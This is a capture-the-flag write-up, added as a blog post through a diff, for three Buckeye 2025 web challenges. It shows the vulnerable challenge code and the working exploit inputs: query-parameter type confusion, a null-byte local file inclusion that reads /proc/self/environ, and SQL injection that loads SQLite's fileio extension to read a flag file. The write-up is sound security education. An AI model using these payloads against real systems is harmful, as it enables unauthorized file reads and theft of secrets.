@@ -1,0 +1,579 @@
+---
+layout: post
+title:  "Buckeye 2025 web challenges"
+date:   2025-11-10 17:51:10 -0400
+author: robo.uzi
+tags: [CTF]
+permalink: /buckeye-web/
+---
+* TOC
+{:toc}
+{% raw %}
+## BIG CHUNGUS
+
+**Category**: web
+
+**Description**: There's wabbit twouble afoot. [https://big-chungus.challs.pwnoh.io](https://big-chungus.challs.pwnoh.io) 
+
+I get the challenge files. Here is `index.js`:
+```js
+import express from "express";  
+  
+const app = express();  
+  
+app.get("/", (req, res) => {  
+if (!req.query.username) {  
+res.send(`  
+<!DOCTYPE html>  
+<html>  
+<head>  
+ <title>NO CHUNGUS</title>  
+ <style>  
+   body {  
+     font-family: Comic Sans MS;  
+     background: linear-gradient(45deg, #ff0000, #00ff00, #0000ff);  
+     animation: rainbow 2s infinite;  
+     text-align: center;  
+     padding: 50px;  
+   }  
+   @keyframes rainbow {  
+     0% { background-position: 0% 50%; }  
+     50% { background-position: 100% 50%; }  
+     100% { background-position: 0% 50%; }  
+   }  
+   h1 { font-size: 100px; color: white; text-shadow: 5px 5px black; }  
+   img { width: 300px; border: 10px solid yellow; animation: spin 1s infinite; }  
+   @keyframes spin {  
+     from { transform: rotate(0deg); }  
+     to { transform: rotate(360deg); }  
+   }  
+   .marquee {  
+     font-size: 50px;  
+     color: lime;  
+     animation: marquee 3s linear infinite;  
+   }  
+ </style>  
+</head>  
+<body>  
+ <h1>NO CHUNGUS DETECTED</h1>  
+ <div class="marquee">⚠ WARNING: NO CHUNGUS FOUND ⚠</div>  
+ <img src="https://i.imgflip.com/aaxz3e.jpg" alt="NO CHUNGUS" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22%3E%3Ctext x=%220%22 y=%2215%  
+22 font-size=%2220%22%3ENO CHUNGUS%3C/text%3E%3C/svg%3E'">  
+ <p style="font-size: 30px; color: red;"> WHERE IS CHUNGUS? </p>  
+ <form method="GET">  
+   <input type="text" name="username" placeholder="Enter username..." style="font-size: 20px; padding: 10px;">  
+   <button type="submit" style="font-size: 20px; padding: 10px;">CHECK CHUNGUS</button>  
+ </form>  
+</body>  
+</html>  
+   `);  
+return;  
+}  
+  
+if (req.query.username.length > 0xB16_C4A6A5) {  
+res.send(`  
+<!DOCTYPE html>  
+<html>  
+<head>  
+ <title>BIG CHUNGUS!!!</title>  
+ <style>  
+   body {  
+     font-family: Impact, Arial Black;  
+     background: repeating-linear-gradient(45deg, #ff0000, #ff0000 10px, #ffff00 10px, #ffff00 20px);  
+     text-align: center;  
+     padding: 20px;  
+     animation: shake 0.5s infinite;  
+   }  
+   @keyframes shake {  
+     0%, 100% { transform: translate(0, 0); }  
+     25% { transform: translate(-10px, 10px); }  
+     75% { transform: translate(10px, -10px); }  
+   }  
+   h1 {  
+     font-size: 150px;  
+     color: #ff00ff;  
+     text-shadow: 10px 10px 0px #00ffff, 20px 20px 0px #ffff00;  
+     animation: pulse 0.3s infinite;  
+   }  
+   @keyframes pulse {  
+     0%, 100% { transform: scale(1); }  
+     50% { transform: scale(1.1); }  
+   }  
+   img {  
+     width: 500px;  
+     border: 20px dashed lime;  
+     animation: zoom 0.5s infinite alternate;  
+   }  
+   @keyframes zoom {  
+     from { transform: scale(1); }  
+     to { transform: scale(1.2); }  
+   }  
+   .username { font-size: 40px; color: white; background: black; padding: 10px; }  
+   .blink { animation: blink 0.5s infinite; }  
+   @keyframes blink {  
+     0%, 50% { opacity: 1; }  
+     51%, 100% { opacity: 0; }  
+   }  
+ </style>  
+</head>  
+<body>  
+ <h1>BIG CHUNGUS!!!</h1>  
+ <div class="username blink">Welcome, ${req.query.username}!</div>  
+ <img src="https://purepng.com/public/uploads/large/big-chungus-jkg.png" alt="BIG CHUNGUS" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22  
+%3E%3Ctext x=%220%22 y=%2215%22 font-size=%2220%22%3EBIG CHUNGUS%3C/text%3E%3C/svg%3E'">  
+ <p style="font-size: 50px; color: white; background: red; padding: 20px;"> YOU FOUND THE BIGGEST CHUNGUS! </p>  
+ <p style="font-size: 30px; color: lime;">FLAG: ${  
+process.env.FLAG || "FLAG_NOT_SET"  
+}</p>  
+ <marquee style="font-size: 60px; color: yellow;">BIG CHUNGUS IS HERE BIG CHUNGUS IS HERE BIG CHUNGUS IS HERE</marquee>  
+ <form method="GET">  
+   <input type="text" name="username" placeholder="Enter username..." style="font-size: 20px; padding: 10px;">  
+   <button type="submit" style="font-size: 20px; padding: 10px;">CHECK CHUNGUS</button>  
+ </form>  
+</body>  
+</html>  
+   `);  
+return;  
+}  
+  
+res.send(`  
+<!DOCTYPE html>  
+<html>  
+<head>  
+ <title>little chungus - so very sad</title>  
+ <style>  
+   body {  
+     font-family: 'Times New Roman', serif;  
+     background: linear-gradient(to bottom, #1a1a2e, #16213e, #0f3460);  
+     text-align: center;  
+     padding: 30px;  
+     color: #e0e0e0;  
+     position: relative;  
+     overflow: hidden;  
+     min-height: 100vh;  
+   }  
+   .rain {  
+     position: absolute;  
+     width: 100%;  
+     height: 100%;  
+     top: 0;  
+     left: 0;  
+     pointer-events: none;  
+     z-index: 0;  
+   }  
+   .drop {  
+     position: absolute;  
+     width: 2px;  
+     height: 50px;  
+     background: rgba(150, 200, 255, 0.5);  
+     animation: fall linear infinite;  
+     animation-duration: var(--duration);  
+     animation-delay: var(--delay);  
+     left: var(--left);  
+     top: -50px;  
+   }  
+   @keyframes fall {  
+     to {  
+       top: 100vh;  
+       opacity: 0;  
+     }  
+   }  
+   .content {  
+     position: relative;  
+     z-index: 1;  
+   }  
+   h1 {  
+     font-size: 80px;  
+     color: #a0a0a0;  
+     text-shadow: 3px 3px 10px rgba(0,0,0,0.8);  
+     animation: fadeInOut 3s ease-in-out infinite;  
+     margin: 20px 0;  
+   }  
+   @keyframes fadeInOut {  
+     0%, 100% { opacity: 0.5; }  
+     50% { opacity: 1; }  
+   }  
+   h2 {  
+     font-size: 40px;  
+     color: #888;  
+     margin: 30px 0;  
+     font-style: italic;  
+   }  
+   .username {  
+     font-size: 28px;  
+     color: #bbb;  
+     margin: 30px 0;  
+     padding: 15px;  
+     background: rgba(0,0,0,0.3);  
+     border-left: 5px solid #555;  
+   }  
+   img {  
+     width: 250px;  
+     border: 5px solid #555;  
+     opacity: 0.7;  
+     filter: grayscale(70%);  
+     animation: shrink 2s ease-in-out infinite;  
+     margin: 20px 0;  
+   }  
+   @keyframes shrink {  
+     0%, 100% { transform: scale(1); }  
+     50% { transform: scale(0.95); }  
+   }  
+   .sad-message {  
+     font-size: 24px;  
+     color: #999;  
+     margin: 30px 20px;  
+     line-height: 1.8;  
+     font-style: italic;  
+   }  
+   .tears {  
+     font-size: 60px;  
+     animation: cry 1s ease-in-out infinite;  
+     margin: 20px 0;  
+   }  
+   @keyframes cry {  
+     0%, 100% { transform: translateY(0); }  
+     50% { transform: translateY(10px); }  
+   }  
+   form {  
+     margin-top: 40px;  
+     padding: 20px;  
+     background: rgba(0,0,0,0.4);  
+     border-radius: 10px;  
+     display: inline-block;  
+   }  
+   input, button {  
+     font-size: 18px;  
+     padding: 10px;  
+     background: #2a2a3e;  
+     color: #ddd;  
+     border: 1px solid #555;  
+   }  
+ </style>  
+</head>  
+<body>  
+ <div class="rain" id="rain"></div>  
+ <div class="content">  
+   <div class="tears">  </div>  
+   <h1>little chungus</h1>  
+   <h2>so very, very little...</h2>  
+   <div class="username">Welcome, ${req.query.username}...</div>  
+   <img src="https://images.steamusercontent.com/ugc/943958709953537755/556C9BC26D0E7261242A75A13AF865DA892DFEBC/?imw=5000&imh=5000&ima=fit&impolicy=Letterbox&imcolor=%230000  
+00&letterbox=false" alt="little chungus" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22%3E%3Ctext x=%220%22 y=%2215%22 font-size=%2220%22%  
+3Elittle chungus%3C/text%3E%3C/svg%3E'">  
+   <div class="sad-message">  
+     <p> It is truly a tragedy... The chungus is so very, very little...</p>  
+     <p> Why must the chungus suffer so? Why must it be so small?</p>  
+     <p> The universe weeps for this tiny chungus...</p>  
+     <p> One day, perhaps, the chungus will grow... but today is not that day...</p>  
+     <p> We can only hope... and dream... of a BIGGER chungus...</p>  
+   </div>  
+   <form method="GET">  
+     <input type="text" name="username" placeholder="Try again... maybe...">  
+     <button type="submit">Search for Hope</button>  
+   </form>  
+ </div>  
+ <script>  
+   const rain = document.getElementById('rain');  
+   for (let i = 0; i < 50; i++) {  
+     const drop = document.createElement('div');  
+     drop.className = 'drop';  
+     drop.style.setProperty('--left', Math.random() * 100 + '%');  
+     drop.style.setProperty('--duration', (Math.random() * 2 + 1) + 's');  
+     drop.style.setProperty('--delay', Math.random() * 2 + 's');  
+     rain.appendChild(drop);  
+   }  
+ </script>  
+</body>  
+</html>  
+ `);  
+});  
+  
+app.listen(3000, () => {  
+console.log("Server running on port 3000");  
+});
+```
+
+The code checks for the query parameter `username` in the url: `https://big-chungus.challs.pwnoh.io/?username=admin`.
+
+When using `?username=admin`, it treats the username as a string, then looks at its `.length` property. 
+
+Using `?username[length]=999999999999999` instead, the framework parses it differently and turns the username parameter into an object with a key inside called length with the value `999999999999999`. 
+
+Now when the code checks `username.length` it doesnt get the length of the string. It directly gets the length key from the object. 
+
+Javascript then converts the number in the url `999999999999999` to a real number for the comparison (`if (req.query.username.length > 0xB16_C4A6A5)`) in the code. `0xB16_C4A6A5` is a hex number equating to `47626626725`. If its bigger you get the flag. 
+
+This works because the code assumes `username` will always be a string. The URL can be changed to make it an object instead, hijacking what `.length` returns (prototype pollution).
+
+Final link: `https://big-chungus.challs.pwnoh.io/?username[length]=999999999999999`
+
+`bctf{b16_chun6u5_w45_n3v3r_7h15_b16}`
+
+___
+
+## Awklet
+
+**Category**: web
+
+**Description**: Well this is awkward... [https://awklet.challs.pwnoh.io](https://awklet.challs.pwnoh.io)
+
+I get the challenge files. There are 4 `txt` files that contain the fonts for the ascii art generated on the site. Here is `awklet.awk`:
+```shell
+#!/bin/awk -f  
+BEGIN {  
+   SUBSEP = "@"  
+   HEIGHT = 7  
+  
+   printf("Status: 200 OK\n")  
+   printf("Content-type: text/plain\n\n")  
+  
+   parse_query(ENVIRON["QUERY_STRING"], GET)  
+  
+   for (i = 32; i <= 255; i++) {  
+       ord[sprintf("%c", i)] = i  
+   }  
+  
+   if ("name" in GET) {  
+       font_name = (("font" in GET) ? GET["font"] : "standard")  
+       text = GET["name"]  
+       render_ascii(text, font_name)  
+   }  
+}  
+  
+function urldecode(str,    i, hex, out, c) {  
+   out = ""  
+   i = 1  
+  
+   while (i <= length(str)) {  
+       c = substr(str, i, 1)  
+  
+       if (c == "+") out = out " "  
+       else if (c == "%") {  
+           hex = substr(str, i + 1, 2)  
+           out = out sprintf("%c", strtonum("0x" hex))  
+           i += 2  
+       }  
+       else out = out c  
+  
+       i++  
+   }  
+  
+   return out  
+}  
+  
+function parse_query(qs, GET,    start, key, val, pair) {  
+   start = 1  
+  
+   while (match(substr(qs, start), /([^&=]+)=?([^&]*)/, pair)) {  
+       key = urldecode(pair[1])  
+       val = urldecode(pair[2])  
+       GET[key] = val  
+       start += RSTART + RLENGTH - 1  
+   }  
+}  
+  
+function load_font(font_name, font,    filename, line, char, row, c) {  
+   filename = font_name ".txt"  
+   char = 32  
+   row = 0  
+  
+   while ((getline line < filename) > 0) {  
+       font[char, row] = line  
+       row++  
+  
+       if (row == HEIGHT) {  
+           char++  
+           row = 0  
+       }  
+   }  
+  
+   close(filename)  
+}  
+  
+function render_ascii(text, font_name,    font, i, j, c, char, line_out) {  
+   load_font(font_name, font)  
+  
+   print "Here's your " font_name " ascii art:\n"  
+  
+   for (i = 0; i < HEIGHT; i++) {  
+       line_out = ""  
+  
+       for (j = 1; j <= length(text); j++) {  
+           c = substr(text, j, 1)  
+           char = ord[c]  
+           line_out = line_out font[char, i] " "  
+       }  
+  
+       print line_out  
+   }  
+}
+```
+The script will take the parameters `name` and `font`.
+
+From the dockerfile in the challenge files I see the flag is stored as an environment variable. Also I can interact with `awklet.awk` with the url at `https://awklet.challs.pwnoh.io/cgi-bin/awklet.awk`:
+```shell
+FROM debian:stable-slim  
+  
+RUN apt-get update && \  
+   apt-get install -y apache2 gawk && \  
+   apt-get clean && rm -rf /var/lib/apt/lists/*  
+  
+RUN echo "PassEnv FLAG" >> /etc/apache2/conf-available/flag.conf && \  
+   a2enconf flag  
+  
+RUN a2enmod cgi  
+  
+RUN sed -i 's/Listen 80/Listen 8080/' /etc/apache2/ports.conf && \  
+   sed -i 's/:80/:8080/g' /etc/apache2/sites-enabled/000-default.conf  
+  
+COPY awklet.awk standard.txt slant.txt block.txt shadow.txt /usr/lib/cgi-bin/  
+COPY index.html /var/www/html/index.html  
+  
+RUN chmod +x /usr/lib/cgi-bin/awklet.awk  
+  
+CMD ["apachectl", "-D", "FOREGROUND"]
+```
+
+I test the `font` parameter for LFI. After some testing I get the flag at the url: `https://awklet.challs.pwnoh.io/cgi-bin/awklet.awk?name=%20&font=%2Fproc%2Fself%2Fenviron%00`:
+```html
+Here's your /proc/self/environ� ascii art:
+
+FLAG=bctf{n3xt_t1m3_1m_wr171ng_1t_1n_53d}�HTTP_HOST=awklet.challs.pwnoh.io
+�HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+�HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+�HTTP_ACCEPT_ENCODING=gzip, deflate, br, zstd�HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
+�HTTP_DNT=1�HTTP_PRIORITY=u=0i�HTTP_SEC_FETCH_DEST=document�HTTP_SEC_FETCH_MODE=navigate
+�HTTP_SEC_FETCH_SITE=none�HTTP_SEC_FETCH_USER=?1�HTTP_TE=trailers�HTTP_UPGRADE_INSECURE_REQUESTS=1�HTTP_X_FORWARDED_FOR=149.40.62.45
+�HTTP_X_FORWARDED_HOST=awklet.challs.pwnoh.io�HTTP_X_FORWARDED_PORT=443�HTTP_X_FORWARDED_PROTO=https
+�HTTP_X_FORWARDED_SERVER=ip-10-0-1-44.us-east-2.compute.internal�HTTP_X_REAL_IP=149.40.62.45
+�PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+�SERVER_SIGNATURE=<address>Apache/2.4.65 (Debian) Server at awklet.challs.pwnoh.io Port 8080</address>
+```
+Because all the awk script is doing is appending `.txt` to the desired font, appending the null byte caused awk to read and display the file.
+
+`bctf{n3xt_t1m3_1m_wr171ng_1t_1n_53d}`
+
+___
+
+## Packages
+
+**Category**: web
+
+**Description**: Explore the world of debian/debian-based packages. [https://packages.challs.pwnoh.io](https://packages.challs.pwnoh.io) 
+
+I get the challenge files. I see from the Dockerfile the flag is stored in `/app/flag.txt`. Here is `main.py`:
+```python
+import sqlite3  
+import json  
+from flask import Flask, request, render_template_string  
+  
+app = Flask(__name__)  
+  
+  
+db = sqlite3.connect("packages.db", check_same_thread=False)  
+db.enable_load_extension(True)  
+db.row_factory = sqlite3.Row  
+  
+TEMPLATE = """  
+<!doctype html>  
+<html lang="en">  
+<head>  
+   <meta charset="utf-8">  
+   <title>Package Search</title>  
+   <style>  
+       body { font-family: sans-serif; max-width: 800px; margin: 2rem auto; }  
+       form { margin-bottom: 1rem; }  
+       table { border-collapse: collapse; width: 100%; }  
+       th, td { border: 1px solid #ccc; padding: 0.5rem; text-align: left; }  
+       th { background: #f4f4f4; }  
+   </style>  
+</head>  
+<body>  
+   <h1>Package Search</h1>  
+   <form method="get">  
+       <label>Distro:  
+           <input name="distro" value="{{ request.args.get('distro', '') }}">  
+       </label>  
+       <label>Package:  
+           <input name="package" value="{{ request.args.get('package', '') }}">  
+       </label>  
+       <button type="submit">Search</button>  
+   </form>  
+  
+   {% if results %}  
+       <h2>Showing {{ results|length }} result{{ 's' if results|length != 1 else '' }}</h2>  
+       <table>  
+           <tr>  
+               <th>Distro</th>  
+               <th>Distro Version</th>  
+               <th>Package</th>  
+               <th>Package Version</th>  
+           </tr>  
+           {% for row in results %}  
+               <tr>  
+                   <td>{{ row['distro'] }}</td>  
+                   <td>{{ row['distro_version'] }}</td>  
+                   <td>{{ row['package'] }}</td>  
+                   <td>{{ row['package_version'] }}</td>  
+               </tr>  
+           {% endfor %}  
+       </table>  
+   {% else %}  
+       <p>No results found.</p>  
+   {% endif %}  
+</body>  
+</html>  
+"""  
+  
+  
+@app.route("/", methods=["GET"])  
+def index():  
+distro = request.args.get("distro", "").strip().lower()  
+package = request.args.get("package", "").strip().lower()  
+  
+sql = "SELECT distro, distro_version, package, package_version FROM packages"  
+if distro or package:  
+    sql += " WHERE "  
+if distro:  
+    sql += f"LOWER(distro) = {json.dumps(distro)}"  
+if distro and package:  
+    sql += " AND "  
+if package:  
+    sql += f"LOWER(package) = {json.dumps(package)}"  
+sql += " ORDER BY distro, distro_version, package"  
+  
+print(sql)  
+results = db.execute(sql).fetchall()  
+  
+return render_template_string(TEMPLATE, request=request, results=results)  
+  
+  
+if __name__ == "__main__":  
+app.run(host="0.0.0.0", port=8000)
+```
+
+From the line `db.enable_load_extension(True)` I can see if SQLi is possible, I can load an extension to read the flag file. 
+
+After testing I find the payload `x" UNION SELECT 'a','b','c','d'--` works. 
+Response:
+```shell
+Distro 	Distro Version 	Package 	Package Version
+a 	    b 	            c 	        d
+```
+
+I enumerated a lot of info about the database even though I know the flag is not stored inside. After more testing I find this payload loads the correct extension I need: 
+`x" UNION SELECT 'a','b','c', (SELECT load_extension('/sqlite/ext/misc/fileio'))--`
+
+Then I read the file with: 
+`x" UNION SELECT 'a','b','c', (SELECT readfile('/app/flag.txt'))--` 
+
+Response:
+```shell
+Distro  Distro Version  Package  Package Version
+a       b               c        b'bctf{y0uv3_g0t_4n_apt17ud3_f0r_7h15}\n'
+```
+
+`bctf{y0uv3_g0t_4n_apt17ud3_f0r_7h15}`
+{% endraw %}
+___
